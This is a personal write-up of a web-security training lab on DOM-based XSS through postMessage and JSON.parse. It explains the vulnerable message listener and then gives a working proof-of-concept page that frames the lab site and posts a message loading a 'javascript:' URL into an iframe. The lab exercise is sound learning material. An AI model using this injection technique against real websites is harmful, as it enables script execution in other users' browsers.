# [DOM Vuln] DOM XSS using web messages and JSON.parse (1)

---

![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled.png)

using my extension firebug lite to filter the script we’re able to see that this web app has a event listener: 

![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%201.png)

![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%202.png)

CHATGPT BREAK DOWN OF THE CODE: 

1. The `window.addEventListener('message', function(e) {...}, false);` line sets up an event listener for the 'message' event. The function inside is the callback that will be executed when a 'message' event is fired.
2. Inside the callback function, an iframe is created and appended to the document body. An object `ACMEplayer` is also created with a single property `element` that references the iframe.
3. The code then attempts to parse the data from the event (`e.data`) as JSON. If the parsing fails (i.e., the data is not valid JSON), the function returns and no further action is taken.
4. If the parsing is successful, the code then checks the `type` property of the parsed data and performs different actions based on its value:
    - If `type` is "page-load", it scrolls the iframe into view.
    - If `type` is "load-channel", it sets the `src` of the iframe to the `url` property of the parsed data.
    - If `type` is "player-height-changed", it changes the width and height of the iframe to the `width` and `height` properties of the parsed data, respectively
    
    ---
    
    ### Let's try and create a POC
    
    - the message needs to contain some type of json string
    
    ![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%203.png)
    
    ### Exploit server
    
    so we’re able to use the exploit server and be able to actually inject what ever URL we want in to it: 
    
    ![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%204.png)
    
    also, we can have an alert popup as such: 
    
    ![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%205.png)
    
    but I also found away to possibly escape this src tag. 
    
    ![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%206.png)
    
    The payload: 
    
    ![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%207.png)
    
    maybe if we can escape the src tag of the iframe we can have it include a event handler like onload. 
    
    ```jsx
    <style>
        body, html {
            margin: 0;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }
    </style>
    <iframe id="myIframe" src="https://0a730063039cd77e811bd4ee0066000f.web-security-academy.net/"></iframe>
    
    <script>
    var iframe = document.getElementById('myIframe');
    
    iframe.onload = function() {
      // Send a message to the iframe's content window
      iframe.contentWindow.postMessage(JSON.stringify({ type: 'load-channel', url: 'javascript:print()//default.asp' }), '*');
    };
    </script>
    ```
    
    Note that we cannot always use Json stringify because there will be instances that json stringify will encode certain quotes that weren't supposed to be encoded into the HTML string. 
    
    ![Untitled](%5BDOM%20Vuln%5D%20DOM%20XSS%20using%20web%20messages%20and%20JSON%20par%205396172a14bd472d8e932bb20c69c867/Untitled%208.png)